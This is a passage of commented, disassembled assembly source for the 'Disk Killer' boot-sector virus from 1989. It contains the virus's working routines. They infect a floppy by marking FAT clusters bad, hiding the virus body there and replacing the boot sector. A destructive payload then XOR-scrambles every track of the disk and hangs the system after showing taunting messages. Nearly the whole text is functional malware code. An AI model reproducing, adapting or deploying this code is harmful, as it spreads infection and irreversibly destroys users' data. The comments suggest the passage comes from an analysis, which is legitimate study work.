                div     cl                          ; al, ah rem = ax/reg
                mov     cl,al
                mov     ax,RootDirEntries           ; (seg_a:0011=70h)
                div     cl                          ; al, ah rem = ax/reg
                add     ax,ReservedSectors          ; (seg_a:000E=1)
                mov     bx,ax
                mov     ax,SectorsPerFAT            ; (seg_a:0016=2)
                mul     FATcopies                   ; (seg_a:0010=2) ax = data * al
                add     bx,ax
                mov     first_data_sec,bx
                ; first_data_sec = (RootDirEntries/(BytesPerSector/20))+ReservedSectors
                ;                  + (SectorsPerFAT*FATcopies)
                ; eg 70h/(200h/20h)+1+(2*2) = 0ch

                mov     ax,SectorsPerDisk           ; (seg_a:0013=2D0h)
                sub     ax,bx
                mov     cl,SectorsPerCluster        ; (seg_a:000D=2)
                xor     dx,dx                       ; Zero register
                xor     ch,ch                       ; Zero register
                div     cx                          ; ax,dx rem=dx:ax/reg
                mov     last_data_cluster,ax        ; (seg_a:03F2)
                ; last_data_cluster = (SectorsPerDisk - first_data_sec)/SectorsPerCluster
                ; eg (2d0h-0ch)/2 = 162h

                mov     cx,23h
loc_35:
                  call    rd_FATrec                 ; (0577)
                  cmp     dx,0                      ; free sector
                  jne     loc_36                    ; Jump if not equal
                  inc     free_clusters             ; (seg_a:03F4)
                  mov     al,free_clusters          ; (seg_a:03F4)
                  cmp     al,required_clusters      ; (seg_a:03F5)
                  jne     loc_37                    ; Jump if not equal
                  jmp     short loc_38              ; (0490)
                  nop
loc_36:
                  mov     free_clusters,0           ; (seg_a:03F4)
loc_37:
                  inc     cx
                  cmp     cx,last_data_cluster      ; (seg_a:03F2=162h)
                jne     loc_35                      ; Jump if not equal

                stc                                 ; Set carry flag
                retn
loc_38:
                call    wr_bad_FATrec               ; (0596)
                dec     cx
                dec     al
                jnz     loc_38                      ; Jump if not zero
                inc     cx
                mov     last_bad_FATrec,cx          ; (seg_a:04A1=11Eh)
                clc                                 ; Clear carry flag
                retn
flag_bad_sectors endp
  
_ReservedSectors    dw  1       ; stores ReservedSectors
last_bad_FATrec dw      11Eh    ; stores the last FAT record to be marked bad
first_data_sec  dw      0Ch     ; first available sector on disk

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;               infect_FD  SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

loc_39:
                jmp     loc_40                      ; (052B)

infect_FD       proc    near
                mov     ax,ReservedSectors          ; (seg_a:000E=1)
                mov     _ReservedSectors,ax         ; (seg_a:049F)
                xor     dx,dx                       ; Zero register
                call    conv_notation               ; (00F4)
                lea     bx,buffer_area              ; (seg_a:08A2) Load effective addr
                mov     ax,SectorsPerFAT            ; (seg_a:0016=2)
                call    rd_sector                   ; (0143)
                jc      loc_39                      ; Jump if carry Set
                call    flag_bad_sectors            ; (0420)
                jc      loc_39                      ; Jump if carry Set
                lea     bx,buffer_area              ; (seg_a:08A2) Load effective addr
                mov     ax,SectorsPerFAT            ; (seg_a:0016=2)
                call    wr_sector                   ; (0147)
                jc      loc_39                      ; Jump if carry Set
                mov     ax,_ReservedSectors         ; (seg_a:049F=1)
                add     ax,SectorsPerFAT            ; (seg_a:0016=2)
                xor     dx,dx                       ; Zero register
                call    conv_notation               ; (00F4)
                lea     bx,buffer_area              ; (seg_a:08A2) Load effective addr
                mov     ax,SectorsPerFAT            ; (seg_a:0016=2)
                call    wr_sector                   ; (0147)
                jc      loc_39                      ; Jump if carry Set
                mov     ax,last_bad_FATrec          ; (seg_a:04A1=11Eh)
                sub     ax,2
                xor     dx,dx                       ; Zero register
                mul     SectorsPerCluster           ; (seg_a:000D=2) ax = data * al
                add     ax,first_data_sec           ; (seg_a:04A3=0Ch)
                call    wr_virus_body               ; (03F6)
                jc      loc_40                      ; Jump if carry Set
                lea     bx,buffer_area              ; (seg_a:08A2) Load effective addr
                call    rd_bootsector               ; (0167)
                jc      loc_40                      ; Jump if carry Set
                mov     ax,word ptr virus_body      ; (seg_a:0042=44h)
                mov     dx,word ptr virus_body[2]   ; (seg_a:0044=0)
                add     ax,4
                adc     dx,0
                mov     original_bs,ax              ; (seg_a:0040=48h)
                call    conv_notation               ; (00F4)
                lea     bx,buffer_area              ; (seg_a:08A2) Load effective addr
                mov     al,1
                call    wr_sector                   ; (0147)
                jc      loc_40                      ; Jump if carry Set
                call    replace_bs                  ; (052D)
                jc      loc_40                      ; Jump if carry Set
                clc                                 ; Clear carry flag
                retn
loc_40:
                stc                                 ; Set carry flag
                retn
infect_FD       endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE(052d)
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
replace_bs      proc    near
                lea     si,ds:start                 ; (seg_a:0000=0FAh) Load effective addr
                lea     di,cs:buffer_area           ; (seg_a:08A2) Load effective addr
                lea     cx,cs:end_of_bs             ; Load effective addr
                cld                                 ; Clear direction
                rep     movsb                       ; Rep when cx >0 Mov [si] to es:[di]

                                                    ; patch various places
                lea     bx,buffer_area                          ; (seg_a:08A2) Load effective addr
                mov     byte ptr ds:[bx][offset code_patch],13h ; (seg_a:0164=13h)
                mov     word ptr [bx][offset counter_lo],0      ; (seg_a:01F0=0)
                mov     byte ptr [bx][offset counter_hi],0      ; (seg_a:01F2=0)

                test    drive,80h                               ; (seg_a:004A=0)
                jnz     loc_41                                  ; Jump if not zero
                mov     byte ptr [bx][offset marker1],0         ; (seg_a:01F3=0)
                jmp     short loc_42                            ; (0564)
                nop
loc_41:
                mov     byte ptr [bx][offset marker1],0AAh  ; (seg_a:01F3)
loc_42:
                mov     ax,[bx][offset SectorsPerTrack]
;*              nop                                 ;*Fixup for MASM (M)

                xor     dx,dx                       ; Zero register
                call    conv_notation

                mov     al,1
                lea     bx,buffer_area              ; (seg_a:08A2) Load effective addr
                call    wr_sector
                retn
replace_bs      endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;               rd_FATrec  SUBROUTINE(0577)
;
; reads the required 12bit FAT entry
;
; input in cx (eg. 23h)
; output in dx
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
rd_FATrec       proc    near
                push    cx
                lea     si,buffer_area              ; (seg_a:08A2) Load effective addr
                mov     bx,cx
                shl     bx,1                        ; Shift w/zeros fill
                add     bx,cx
                shr     bx,1                        ; Shift w/zeros fill
                                                    ; bx = 1.5 * cx
                mov     dx,[bx+si]
                test    cx,1
                jz      loc_43                      ; Jump if zero
                mov     cl,4
                shr     dx,cl                       ; Shift w/zeros fill
                                                    ; correct odd entries

loc_43:
                and     dx,0FFFh
                pop     cx
                retn
rd_FATrec       endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;               wr_bad_FATrec SUBROUTINE(0596)
;
; mark FAT entry as bad
; input in cx
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
wr_bad_FATrec   proc    near
                push    cx
                lea     si,buffer_area              ; (seg_a:08A2) Load effective addr
                mov     bx,cx
                shl     bx,1                        ; Shift w/zeros fill
                add     bx,cx
                shr     bx,1                        ; Shift w/zeros fill
                                                    ; x = 1.5 * cx
                mov     dx,[bx+si]
                test    cx,1
                jz      loc_44                      ; Jump if zero
                                                    ; for odd entries:
                and     dx,0Fh
                nop                                 ;*Fixup for MASM (M)
                or      dx,0FF70h                   ; mark as bad
                jmp     short loc_45                ; (05BE)
                nop
loc_44:                                             ; for even entries:
                and     dx,0F000h
                or      dx,0FF7h                    ; mark as bad
loc_45:
                mov     [bx+si],dx
                pop     cx
                retn
wr_bad_FATrec   endp

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                          damage the disk(05c2)
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
  
damage:                                             ; damage the disk
                mov     byte ptr cs:code_patch,13h  ; restore the patched code
                cli                                 ; Disable interrupts
                xor     ax,ax                       ; Zero register
                mov     ds,ax
                ASSUME  ds:seg_0
                                                        ; int 9 -> int 82
                mov     ax,word ptr ds:int9_vector      ; (0000:0024)
                mov     word ptr ds:int82_vector,ax     ; (0000:0208)
                mov     ax,word ptr ds:int9_vector[2]   ; (0000:0026)
                mov     word ptr ds:int82_vector[2],ax  ; (0000:020A)

                                                        ; int_9_entry -> int 9
                mov     ax,offset int_9_entry           ; (028A)
                mov     word ptr int9_vector,ax         ; (0000:0024)
                mov     ax,cs
                mov     word ptr int9_vector[2],ax      ; (0000:0026)

                                                        ; restore all other interrupts
                mov     ax,word ptr ds:int81_vector     ; (0000:0204)
                mov     word ptr int8_vector,ax         ; (0000:0020)
                mov     ax,word ptr ds:int81_vector[2]  ; (0000:0206)
                mov     word ptr int8_vector[2],ax      ; (0000:0022)
                mov     ax,word ptr ds:int83_vector     ; (0000:020C)
                mov     word ptr int13_vector,ax        ; (0000:004C)
                mov     ax,word ptr ds:int83_vector[2]  ; (0000:020E)
                mov     word ptr int13_vector[2],ax     ; (0000:004E)
                sti                                     ; Enable interrupts

                mov     ax,cs
                mov     ds,ax
                mov     es,ax
                ASSUME  ds:seg_a, es:seg_a

                sub     ax,1000h
                mov     store_es,ax                 ; (seg_a:0862)
                cmp     marker1,0                   ; (seg_a:01F3)
                je      loc_46                      ; Jump if equal
                mov     dl,_drive                   ; (seg_a:01F4)
loc_46:
                mov     drive,dl                    ; (seg_a:004A)
                lea     bx,buffer_area              ; (seg_a:08A2) Load effective addr
                call    rd_bootsector               ; (0167)
                call    cp_boot_record              ; (0813)
                mov     ah,0Fh
                int     10h                         ; Video display   ah=functn 0Fh
                                                    ;  get state, al=mode, bh=page
                mov     ah,0
                int     10h                         ; Video display   ah=functn 00h
                                                    ;  set display mode in al
                mov     ax,600h
                mov     cx,0
                mov     dx,184Fh
                mov     bx,7
                int     10h                         ; Video display   ah=functn 06h
                                                    ;  scroll up, al=lines
                mov     ah,2
                mov     bh,0
                mov     dx,10Eh
                int     10h                         ; Video display   ah=functn 02h
                                                    ;  set cursor location in dx
                mov     bx,70h
                mov     si,offset str_title         ; (seg_a:073A)
                call    display_str                 ; (0889)
                mov     ah,2
                mov     bh,0
                mov     dx,1523h
                int     10h                         ; Video display   ah=functn 02h
                                                    ;  set cursor location in dx
                mov     bx,2Eh
                mov     si,offset str_warning       ; (seg_a:0774)
                call    display_str                 ; (0889)
                mov     ah,2
                mov     bh,0
                mov     dx,0C23h
                int     10h                         ; Video display   ah=functn 02h
                                                    ;  set cursor location in dx
                mov     bx,8Ch
                mov     si,offset str_processing    ; (seg_a:07D2)
                call    display_str                 ; (0889)

                                                    ; annihilate 200h of the buffer area
                lea     ax,buffer_area              ; (seg_a:08A2) Load effective addr
                mov     di,ax
                mov     ax,0
                mov     cx,BytesPerSector           ; (seg_a:000B=200h)
                cld                                 ; Clear direction
                rep     stosb                       ; Rep when cx >0 Store al to es:[di]

                mov     ax,SectorsPerTrack          ; (seg_a:0018=9)
                mov     word ptr buffer_area[6],ax  ; (seg_a:08A8)
                mov     cx,BytesPerSector           ; (seg_a:000B=200h)
                mov     word ptr buffer_area[2],cx  ; (seg_a:08A4)
                mul     cx                          ; dx:ax = reg * ax
                shr     ax,1                        ; Shift w/zeros fill
                mov     words_to_mangle,ax          ; (seg_a:0860)
                mov     ax,SectorsPerDisk           ; (seg_a:0013=2D0h)
                xor     dx,dx                       ; Zero register
                div     SectorsPerTrack             ; (seg_a:0018=9) ax,dxrem=dx:ax/data
                mov     cx,ax
                push    cx
                mov     word ptr buffer_area[4],ax  ; (seg_a:08A6)
                mov     bx,0
                mov     head,bl                     ; (seg_a:013F)
                mov     track,bx                    ; (seg_a:0141)
                mov     sector,1                    ; (seg_a:0140)
                mov     ax,store_es                 ; (seg_a:0862)
                mov     es,ax
                mov     al,1
                call    rd_sector                   ; (0143)
                inc     sector                      ; (seg_a:0140)
                call    wr_sector                   ; (0147)
                pop     cx
                mov     ax,0
  
locloop_47:
                  push    cx
                  mov     bx,0
                  call    rd_track                  ; (0822)
                  jc      loc_48                    ; Jump if carry Set
                  mov     bx,0
                  call    mangle_track             ; (0864)
                  mov     bx,0
                  call    wr_track                  ; (082A)
                  jnc     loc_49                    ; Jump if carry=0
loc_48:
                  push    ax
                  push    cx
                  mov     cl,8
                  div     cl                        ; al, ah rem = ax/reg
                  lea     bx,word ptr buffer_area[8]; (seg_a:08AA=0) Load effective addr
                  mov     cl,ah
                  xor     ah,ah                     ; Zero register
                  add     bx,ax
                  mov     al,80h
                  shr     al,cl                     ; Shift w/zeros fill
                  or      al,[bx]
                  mov     [bx],al
                  pop     cx
                  pop     ax
loc_49:
                  inc     ax
                  pop     cx
                loop    locloop_47                  ; Loop if cx > 0

                mov     head,0                      ; (seg_a:013F=0)
                mov     track,0                     ; (seg_a:0141=4)
                mov     sector,1                    ; (seg_a:0140=1)
                mov     ax,cs
                mov     es,ax
                mov     bx,offset buffer_area       ; (seg_a:08A2)
                mov     al,1
                call    wr_sector                   ; (0147)
                mov     ax,600h
                mov     cx,0
                mov     dx,184Fh
                mov     bx,8
                int     10h                         ; Video display   ah=functn 06h
                                                    ;  scroll up, al=lines
                mov     ah,2
                mov     bh,0
                mov     dx,0C00h
                int     10h                         ; Video display   ah=functn 02h
                                                    ;  set cursor location in dx
                mov     bx,2Ch
                mov     si,offset str_good_luck     ; (seg_a:07DF)
                call    display_str                 ; (0889)

loc_50:                                             ; Hang the system
                jmp     short loc_50                ; (0738)

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                       Texts
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
str_title       db      'Disk Killer -- Version 1.00 by COMPUTER OGRE 04/01/1989', 0Dh, 0Ah, 0
str_warning     db      'Warning !!', 0Dh, 0Ah, 0Ah
                db      'Don', 27h, 't turn off the power or remove the diskette while Disk Killer is Processing!', 0
str_processing  db      'PROCESSING', 0Dh, 0Ah, 0
str_good_luck   db      'Now you can turn off the power.', 0Dh, 0Ah, 0Ah
                db      'I wish you luck !', 0
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE(0813)
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
cp_boot_record  proc    near
                push    di
                mov     cx,3Ah
                mov     si,offset buffer_area + 3   ; (seg_a:08A5)
                mov     di,offset disk_info         ; (seg_a:0003)
                cld                                 ; Clear direction
                rep     movsb                       ; Rep when cx >0 Mov [si] to es:[di]

                pop     di
                retn
cp_boot_record  endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;              read or write a track  SUBROUTINE(0822)
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
; read a track

rd_track        proc    near
                mov     xx_track_func,2             ; (seg_a:0832=0)
                nop
                jmp     short loc_51                ; (0833)
  
;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
; write a track

wr_track:
                mov     xx_track_func,3             ; (seg_a:0832=0)
                nop
                jmp     short loc_51                ; (0833)

xx_track_func   db      0                           ; function to execute

loc_51:
                push    ax
                xor     dx,dx                       ; Zero register
                mov     cx,DiskHeads                ; (seg_a:001A=2)
                div     cx                          ; ax,dx rem=dx:ax/reg
                mov     sector,1                    ; (seg_a:0140=1)
                mov     head,dl                     ; (seg_a:013F=0)
                mov     track,ax                    ; (seg_a:0141=4)
                mov     ax,store_es                 ; (seg_a:0862=0)
                mov     es,ax
                mov     ah,xx_track_func            ; (seg_a:0832=0)
                mov     al,byte ptr SectorsPerTrack ; (seg_a:0018=9)
                call    direct_int13                ; (014B)
                jnc     loc_52                      ; Jump if carry=0

                mov     ah,0
                int     13h                         ; Disk  dl=drive #: ah=func a0h
                                                    ;  reset disk, al=return status
                stc                                 ; Set carry flag
loc_52:
                pop     ax
                retn
rd_track        endp
  
words_to_mangle dw      0
store_es        dw      0
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;               mess up a sector(0864)
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
mangle_track   proc    near
                push    ax
                push    ds
                push    store_es                    ; (seg_a:0862=0)
                pop     ds
                mov     cx,cs:words_to_mangle       ; (seg_a:0860=0)
                mov     dl,al
                shr     dl,1                        ; Shift w/zeros fill
                jc      loc_53                      ; Jump if carry Set
                xor     ax,0AAAAh
                jmp     short locloop_54            ; (087E)
loc_53:
                xor     ax,5555h
  
locloop_54:
                  xor     ax,[bx]
                  mov     [bx],ax
                  inc     bx
                  inc     bx
                loop    locloop_54                  ; Loop if cx > 0
  
                pop     ds
                pop     ax
                retn
mangle_track   endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE(0889)
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
display_str     proc    near
                push    cx
                mov     cx,1
loc_55:
                  lodsb                             ; String [si] to al
                  or      al,al                     ; Zero ?
                  jz      loc_57                    ; exit loop if zero
                  cmp     al,20h
                  jb      loc_56                    ; Jump if below (no control chars please)
                  mov     ah,9
                  int     10h                       ; Video display   ah=functn 09h
                                                    ;  set char al & attrib bl @curs
loc_56:
                  mov     ah,0Eh
                  int     10h                       ; Video display   ah=functn 0Eh
                                                    ;  write char al, teletype mode
                jmp     short loc_55                ; (088D)
loc_57:
                pop     cx
                retn
display_str     endp

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              DATA
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
  
buffer_area     db      0FDh                        ; (08A2)
                dw      0FFFFh
                db      347 dup (0)
end_of_code     equ     this byte

seg_a           ends
  
                end     start
